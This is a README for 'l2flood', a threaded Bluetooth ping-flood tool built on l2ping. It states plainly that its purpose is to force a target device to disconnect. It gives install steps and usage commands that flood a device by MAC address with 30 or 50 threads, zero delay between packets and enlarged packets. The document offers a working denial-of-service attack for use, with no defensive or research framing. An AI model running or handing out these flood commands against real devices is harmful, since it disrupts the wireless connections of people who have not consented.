# l2flood

[l2ping][1] with threads.

Flood a given bluetooth device with ping requests in order to force it to
disconnect.

# INSTALL

```bash
git clone https://github.com/kovmir/l2flood
cd l2flood
make
sudo make install
```

# USAGE

```bash
l2flood 94:3a:2c:e1:2b:07 # Flood a given device using 30 threads.
l2flood -n 50 94:3a:2c:e1:2b:07 # Flood a given device using 50 threads.
```

* The default delay between packets has been changed to `0`.
* The default data packet size has been increase to `600`.
* `l2ping` options work.

[1]: https://linux.die.net/man/1/l2ping
